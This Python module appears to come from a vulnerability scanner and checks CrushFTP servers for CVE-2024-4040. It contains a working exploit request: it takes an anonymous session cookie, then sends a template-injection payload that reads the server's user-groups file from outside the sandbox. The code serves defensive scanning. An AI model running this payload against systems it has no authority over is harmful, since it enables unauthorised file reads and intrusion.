"""Agent Asteroid implementation for CVE-2024-4040"""

import requests
from requests import exceptions as requests_exceptions
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from ostorlab.agent.kb import kb


from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Unauthenticated arbitrary file read and remote code execution in CrushFTP"
)
VULNERABILITY_REFERENCE = "CVE-2024-4040"
VULNERABILITY_DESCRIPTION = (
    "A server side template injection vulnerability in CrushFTP in all versions before "
    "10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files "
    "from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative "
    "access, and perform remote code execution on the server."
)

DEFAULT_TIMEOUT = 30
MAX_REDIRECTS = 2


@exploits_registry.register
class CVE20244040Exploit(definitions.Exploit):
    """
    CVE-2024-4040: Unauthenticated arbitrary file read and remote code execution in CrushFTP.
    """

    def __init__(self):
        self.token = ""

    def accept(self, target: definitions.Target) -> bool:
        try:
            self._login_anonymous(target.url)
            if self.token != "":
                return True
        except requests_exceptions.RequestException:
            return False

        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            resp = self._cmd(target.url)
            if "<groups" in resp.text:
                vulnerability = self._create_vulnerability(target)
                vulnerabilities.append(vulnerability)

                return vulnerabilities

        except requests_exceptions.RequestException:
            return vulnerabilities

        return vulnerabilities

    def _create_vulnerability(
        self, target: definitions.Target
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target.origin} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability

    def _login_anonymous(self, target: str) -> None:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False

        r = session.get(target + "WebInterface/", timeout=DEFAULT_TIMEOUT)
        c = r.cookies.get_dict()
        if "CrushAuth" not in c:
            raise requests_exceptions.RequestException

        self.token = c["CrushAuth"]

    def _headers(self) -> dict[str, str]:
        h = {}
        if self.token != "":
            current_auth = self.token[-4:] if len(self.token) >= 4 else ""
            h["Cookie"] = f"CrushAuth={self.token}; currentAuth={current_auth}"
            h["user_ip"] = "127.0.0.1"

        return h

    def _cmd(self, target: str) -> requests.Response:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        h = self._headers()
        current_auth = self.token[-4:] if len(self.token) >= 4 else ""
        data = {
            "command": "exists",
            "random": "0.34712915617878926",
            "paths": "<INCLUDE>users/MainUsers/groups.XML</INCLUDE>",
        }
        if current_auth != "":
            data["c2f"] = current_auth
        r = session.post(
            target + "WebInterface/function/",
            timeout=DEFAULT_TIMEOUT,
            headers=h,
            data=data,
        )
        return r
